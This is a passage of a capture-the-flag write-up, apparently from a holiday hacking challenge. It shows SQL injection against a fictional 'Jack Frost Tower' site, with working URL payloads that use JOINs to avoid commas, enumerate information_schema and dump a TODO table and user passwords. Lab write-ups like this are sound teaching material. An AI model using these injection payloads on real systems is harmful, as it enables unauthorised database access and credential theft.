<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">127.0.0.1</span><span class="p">:</span><span class="mi">1155</span><span class="o">/</span><span class="n">detail</span><span class="o">/</span><span class="mi">2</span><span class="p">,</span><span class="mi">2</span><span class="o">%</span><span class="mi">20</span><span class="n">UNION</span><span class="o">%</span><span class="mi">20</span><span class="n">SELECT</span><span class="o">%</span><span class="mi">20</span><span class="o">*%</span><span class="mi">20</span><span class="n">FROM</span><span class="o">%</span><span class="mi">20</span><span class="n">users</span><span class="o">%</span><span class="mi">20</span><span class="n">where</span><span class="o">%</span><span class="mi">20</span><span class="nb">id</span><span class="o">=</span><span class="nb">id</span>
</pre></div>
</div>
</div>
<div class="section" id="template-dateformat-error">
<h2>Template dateFormat error<a class="headerlink" href="#template-dateformat-error" title="Permalink to this headline">¶</a></h2>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="ne">TypeError</span><span class="p">:</span> <span class="o">/</span><span class="n">app</span><span class="o">/</span><span class="n">webpage</span><span class="o">/</span><span class="n">detail</span><span class="o">.</span><span class="n">ejs</span><span class="p">:</span><span class="mi">29</span>
    <span class="mi">27</span><span class="o">|</span>                             <span class="o">-</span>
    <span class="mi">28</span><span class="o">|</span>                         <span class="o">&lt;%</span> <span class="p">}</span><span class="k">else</span> <span class="p">{</span> <span class="o">%&gt;</span>
 <span class="o">&gt;&gt;</span> <span class="mi">29</span><span class="o">|</span>                             <span class="o">&lt;%=</span> <span class="n">dateFormat</span><span class="p">(</span><span class="n">encontact</span><span class="o">.</span><span class="n">date_update</span><span class="p">,</span> <span class="s2">&quot;mmmm dS, yyyy h:MM:ss&quot;</span><span class="p">)</span> <span class="o">%&gt;</span>
    <span class="mi">30</span><span class="o">|</span>                         <span class="o">&lt;%</span> <span class="p">}</span> <span class="o">%&gt;</span>                     
    <span class="mi">31</span><span class="o">|</span>                         <span class="o">&lt;/</span><span class="n">li</span><span class="o">&gt;</span>
    <span class="mi">32</span><span class="o">|</span>                     <span class="o">&lt;/</span><span class="n">ul</span><span class="o">&gt;</span>

<span class="n">Invalid</span> <span class="n">date</span>
    <span class="n">at</span> <span class="n">Object</span><span class="o">.</span><span class="n">dateFormat</span> <span class="p">(</span><span class="o">/</span><span class="n">app</span><span class="o">/</span><span class="n">node_modules</span><span class="o">/</span><span class="n">dateformat</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">dateformat</span><span class="o">.</span><span class="n">js</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">17</span><span class="p">)</span>
    <span class="n">at</span> <span class="nb">eval</span> <span class="p">(</span><span class="nb">eval</span> <span class="n">at</span> <span class="nb">compile</span> <span class="p">(</span><span class="o">/</span><span class="n">app</span><span class="o">/</span><span class="n">node_modules</span><span class="o">/</span><span class="n">ejs</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">ejs</span><span class="o">.</span><span class="n">js</span><span class="p">:</span><span class="mi">618</span><span class="p">:</span><span class="mi">12</span><span class="p">),</span> <span class="o">&lt;</span><span class="n">anonymous</span><span class="o">&gt;</span><span class="p">:</span><span class="mi">45</span><span class="p">:</span><span class="mi">26</span><span class="p">)</span>
    <span class="n">at</span> <span class="n">Array</span><span class="o">.</span><span class="n">forEach</span> <span class="p">(</span><span class="o">&lt;</span><span class="n">anonymous</span><span class="o">&gt;</span><span class="p">)</span>
    <span class="n">at</span> <span class="nb">eval</span> <span class="p">(</span><span class="nb">eval</span> <span class="n">at</span> <span class="nb">compile</span> <span class="p">(</span><span class="o">/</span><span class="n">app</span><span class="o">/</span><span class="n">node_modules</span><span class="o">/</span><span class="n">ejs</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">ejs</span><span class="o">.</span><span class="n">js</span><span class="p">:</span><span class="mi">618</span><span class="p">:</span><span class="mi">12</span><span class="p">),</span> <span class="o">&lt;</span><span class="n">anonymous</span><span class="o">&gt;</span><span class="p">:</span><span class="mi">21</span><span class="p">:</span><span class="mi">18</span><span class="p">)</span>
    <span class="n">at</span> <span class="n">returnedFn</span> <span class="p">(</span><span class="o">/</span><span class="n">app</span><span class="o">/</span><span class="n">node_modules</span><span class="o">/</span><span class="n">ejs</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">ejs</span><span class="o">.</span><span class="n">js</span><span class="p">:</span><span class="mi">653</span><span class="p">:</span><span class="mi">17</span><span class="p">)</span>
    <span class="n">at</span> <span class="n">tryHandleCache</span> <span class="p">(</span><span class="o">/</span><span class="n">app</span><span class="o">/</span><span class="n">node_modules</span><span class="o">/</span><span class="n">ejs</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">ejs</span><span class="o">.</span><span class="n">js</span><span class="p">:</span><span class="mi">251</span><span class="p">:</span><span class="mi">36</span><span class="p">)</span>
    <span class="n">at</span> <span class="n">View</span><span class="o">.</span><span class="n">exports</span><span class="o">.</span><span class="n">renderFile</span> <span class="p">[</span><span class="k">as</span> <span class="n">engine</span><span class="p">]</span> <span class="p">(</span><span class="o">/</span><span class="n">app</span><span class="o">/</span><span class="n">node_modules</span><span class="o">/</span><span class="n">ejs</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">ejs</span><span class="o">.</span><span class="n">js</span><span class="p">:</span><span class="mi">482</span><span class="p">:</span><span class="mi">10</span><span class="p">)</span>
    <span class="n">at</span> <span class="n">View</span><span class="o">.</span><span class="n">render</span> <span class="p">(</span><span class="o">/</span><span class="n">app</span><span class="o">/</span><span class="n">node_modules</span><span class="o">/</span><span class="n">express</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">view</span><span class="o">.</span><span class="n">js</span><span class="p">:</span><span class="mi">135</span><span class="p">:</span><span class="mi">8</span><span class="p">)</span>
    <span class="n">at</span> <span class="n">tryRender</span> <span class="p">(</span><span class="o">/</span><span class="n">app</span><span class="o">/</span><span class="n">node_modules</span><span class="o">/</span><span class="n">express</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">application</span><span class="o">.</span><span class="n">js</span><span class="p">:</span><span class="mi">640</span><span class="p">:</span><span class="mi">10</span><span class="p">)</span>
    <span class="n">at</span> <span class="n">Function</span><span class="o">.</span><span class="n">render</span> <span class="p">(</span><span class="o">/</span><span class="n">app</span><span class="o">/</span><span class="n">node_modules</span><span class="o">/</span><span class="n">express</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">application</span><span class="o">.</span><span class="n">js</span><span class="p">:</span><span class="mi">592</span><span class="p">:</span><span class="mi">3</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="section" id="first-contstraint">
<h2>First Contstraint<a class="headerlink" href="#first-contstraint" title="Permalink to this headline">¶</a></h2>
<p>this error was totally unexpected! … A dateFormat error here?<br/>
Yes, because we need to extract exactly two Date as the 2 last columns. <br/></p>
</div>
<div class="section" id="second-contstraint">
<h2>Second Contstraint<a class="headerlink" href="#second-contstraint" title="Permalink to this headline">¶</a></h2>
<p>by re-analyzing the piece of code, it turns out clearly a second constraint also:<br/>
we cannot use any comma in our UNION sql injection !!!!!!   =:-0<br/></p>
<p>Do you remember? Every comma in the url will mess up with the concatenation of the params in the sql query!
<br /></p>
</div>
<div class="section" id="recap">
<h2>Recap<a class="headerlink" href="#recap" title="Permalink to this headline">¶</a></h2>
<p>we have to execute a UNION without using commas for the second query …. mmmmhhhh<br />
After diving into it and some extra tests … we found the solution by using the JOIN ! :)</p>
</div>
<div class="section" id="the-sql">
<h2>The SQL<a class="headerlink" href="#the-sql" title="Permalink to this headline">¶</a></h2>
<p><a class="reference external" href="https://staging.jackfrosttower.com/detail/2,3%20UNION%20SELECT%20*%20FROM%20(SELECT%20null%20from%20information_schema.tables%20WHERE%20table_schema%20=%20%27encontact%27)%20as%20q1%20join%20(SELECT%20null%20from%20information_schema.tables%20WHERE%20table_schema%20=%20%27encontact%27)as%20q2%20join%20(SELECT%20null%20from%20information_schema.tables%20WHERE%20table_schema%20=%20%27encontact%27)as%20q3%20join%20(SELECT%20TABLE_NAME%20from%20information_schema.tables%20WHERE%20table_schema%20=%20%27encontact%27)as%20q4%20join%20(SELECT%20null%20from%20information_schema.tables%20WHERE%20table_schema%20=%20%27encontact%27)as%20q5%20join%20(SELECT%20date_created%20FROM%20uniquecontact%20WHERE%20id=33)as%20q6%20join%20(SELECT%20date_update%20FROM%20uniquecontact%20WHERE%20id=33)as%20q7%20where%201=1%20--">(here it is our super query)</a> <br/></p>
<p>Yep! it works!<br />
And from there we can see there is a new table in the database: the TODO table,
so we are near to our goal: <b><a class="reference internal" href="#ch12-goal"><span class="std std-ref">Goal</span></a></b>
<br/></p>
</div>
<div class="section" id="others-sql">
<h2>others SQL<a class="headerlink" href="#others-sql" title="Permalink to this headline">¶</a></h2>
<p>We still have to do just two query:<br/>
1- to the information.schema COLUMNS in order to know the fields of the new TODO table<br/>
2- extract the date from the TODO table<br/></p>
<p><a href="https://staging.jackfrosttower.com/detail/1,3%20UNION%20SELECT%20*%20FROM%20(%20SELECT%20null%20)%20as%20q1%20join%20(SELECT%20null%20)%20as%20q2%20join%20(SELECT%20null%20)%20as%20q3%20join%20(SELECT%20null%20)%20as%20q4%20join%20(SELECT%20COLUMN_NAME%20FROM%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20TABLE_SCHEMA%20=%20'encontact'%20AND%20TABLE_NAME%20=%20'todo'%20)%20as%20q5%20join%20(SELECT%20date_created%20FROM%20uniquecontact%20WHERE%20id=1)%20as%20q6%20join%20(SELECT%20date_update%20FROM%20uniquecontact%20WHERE%20id=1)%20as%20q7%20--)">query information schema</a>
<br />
<a href="https://staging.jackfrosttower.com/detail/1,3%20UNION%20SELECT%20*%20FROM%20(%20SELECT%20null%20)%20as%20q1%20join%20(SELECT%20null%20)%20as%20q2%20join%20(SELECT%20null%20)%20as%20q3%20join%20(SELECT%20null%20)%20as%20q4%20join%20(SELECT%20note%20FROM%20todo)%20as%20q5%20join%20(SELECT%20date_created%20FROM%20uniquecontact%20WHERE%20id=1)%20as%20q6%20join%20(SELECT%20date_update%20FROM%20uniquecontact%20WHERE%20id=1)%20as%20q7%20%E2%80%93)">query SELECT from TODO</a></p>
<p>and finally, here are the values of the tremendous Frosty’s TODO list</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>    Buy up land all around Santa&#39;s Castle
    Build bigger and more majestic tower next to Santa&#39;s
    Erode Santa&#39;s influence at the North Pole via FrostFest, the greatest Con in history
    Dishearten Santa&#39;s elves and encourage defection to our cause
    Steal Santa&#39;s sleigh technology and build a competing and way better Frosty present delivery vehicle
    Undermine Santa&#39;s ability to deliver presents on 12/24 through elf staff shortages, technology glitches, and assorted mayhem
    Force Santa to cancel Christmas
    SAVE THE DAY by delivering Frosty presents using merch from the Frost Tower Gift Shop to children world-wide... so the whole world sees that Frost saved the Holiday Season!!!! Bwahahahahaha!
    With Santa defeated, offer the old man a job as a clerk in the Frost Tower Gift Shop so we can keep an eye on him

</pre></div>
</div>
<p>Done!</p>
</div>
<div class="section" id="little-appendix">
<h2>Little Appendix:<a class="headerlink" href="#little-appendix" title="Permalink to this headline">¶</a></h2>
<p>How the UNION worked? Here is an example of the schema we used</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">select</span> <span class="o">*</span> <span class="n">FROM</span> <span class="p">(</span> <span class="n">SELECT</span> <span class="n">null</span> <span class="p">)</span> <span class="k">as</span> <span class="n">q1</span>
    <span class="n">join</span> <span class="p">(</span><span class="n">SELECT</span> <span class="n">null</span> <span class="p">)</span> <span class="k">as</span> <span class="n">q2</span>
    <span class="n">join</span> <span class="p">(</span><span class="n">SELECT</span> <span class="n">null</span> <span class="p">)</span> <span class="k">as</span> <span class="n">q3</span>
    <span class="n">join</span> <span class="p">(</span><span class="n">SELECT</span> <span class="n">note</span> <span class="n">FROM</span> <span class="n">todo</span><span class="p">)</span> <span class="k">as</span> <span class="n">q4</span>
    <span class="n">join</span> <span class="p">(</span><span class="n">SELECT</span> <span class="n">null</span> <span class="p">)</span> <span class="k">as</span> <span class="n">q5</span>
    <span class="n">join</span> <span class="p">(</span><span class="n">SELECT</span> <span class="n">date_created</span> <span class="n">FROM</span> <span class="n">uniquecontact</span> <span class="n">WHERE</span> <span class="nb">id</span><span class="o">=</span><span class="mi">33</span><span class="p">)</span> <span class="k">as</span> <span class="n">q6</span>
    <span class="n">join</span> <span class="p">(</span><span class="n">SELECT</span> <span class="n">date_update</span> <span class="n">FROM</span> <span class="n">uniquecontact</span> <span class="n">WHERE</span> <span class="nb">id</span><span class="o">=</span><span class="mi">33</span><span class="p">)</span> <span class="k">as</span> <span class="n">q7</span> <span class="o">--</span>
</pre></div>
</div>
<p>you can use q1, q2,q3, q4 or q5 and execute whatever SELECT you can need.
<br/>You just cannot use q6 and q7 because they are reserved for displaying only datetime fields.</p>
<p>And here the example of UNION of the table uniquecontact and users.<br/>
we can imagine the resulting table like this</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">+----+-----------+------------+---------+-----------------+----------------------+---------------------+</span>
<span class="o">|</span> <span class="nb">id</span> <span class="o">|</span> <span class="n">full_name</span> <span class="o">|</span> <span class="n">email</span>      <span class="o">|</span>   <span class="n">phone</span> <span class="o">|</span>   <span class="n">country</span>       <span class="o">|</span> <span class="n">date_created</span>         <span class="o">|</span> <span class="n">date_update</span>         <span class="o">|</span>
<span class="o">+----+-----------+------------+---------+-----------------+----------------------+---------------------+</span>
<span class="o">|</span> <span class="mi">33</span> <span class="o">|</span> <span class="n">da1</span>       <span class="o">|</span> <span class="n">da</span><span class="nd">@me</span><span class="o">.</span><span class="n">it</span>   <span class="o">|</span> <span class="mi">11111</span>   <span class="o">|</span>  <span class="n">Bouvet</span> <span class="n">Island</span>  <span class="o">|</span> <span class="mi">2021</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">22</span> <span class="mi">00</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">10</span>  <span class="o">|</span> <span class="mi">2021</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">30</span> <span class="mi">22</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="mi">22</span> <span class="o">|</span>
<span class="o">|</span> <span class="mi">10</span> <span class="o">|</span> <span class="n">test_user</span> <span class="o">|</span> <span class="n">test</span><span class="nd">@me</span><span class="o">.</span><span class="n">it</span> <span class="o">|</span> <span class="n">superpwd</span><span class="o">|</span>  <span class="mi">1</span>              <span class="o">|</span> <span class="mi">2021</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">22</span> <span class="mi">00</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">10</span>  <span class="o">|</span> <span class="mi">2021</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">30</span> <span class="mi">22</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="mi">22</span> <span class="o">|</span>
<span class="o">+----+-----------+------------+---------+-----------------+----------------------+---------------------+</span>

</pre></div>
</div>
<p>in this case, the user’s password appears in the field ‘phone’ because in an UNION the fields on the left table win and are the only name displayed.
<br/></p>
</div>
</div>

    <script type="text/x-thebe-config">
    {
        requestKernel: true,
        binderOptions: {
            repo: "binder-examples/jupyter-stacks-datascience",
            ref: "master",
        },
        codeMirrorConfig: {
            theme: "abcdef",
            mode: "python"
        },
        kernelOptions: {
            kernelName: "python3",
            path: "./."
        },
        predefinedOutput: true
    }
    </script>
    <script>kernelName = 'python3'</script>

              </div>
              
        </div>
    </div>
    
    
    <div class='prev-next-bottom'>
        
    <a class='left-prev' id="prev-link" href="prechallenge12.html" title="previous page">Python Game</a>
    <a class='right-next' id="next-link" href="objective13.html" title="next page">13. FPGA Programming</a>

    </div>
    <footer class="footer mt-5 mt-md-0">
    <div class="container">
      <p>
        
          By Dani & Max<br/>
        
            &copy; Copyright 2021.<br/>
      </p>
    </div>
  </footer>
</main>


      </div>
    </div>

    
  <script src="static/js/index.3da636dd464baa7582d2.js"></script>


    
  </body>
</html>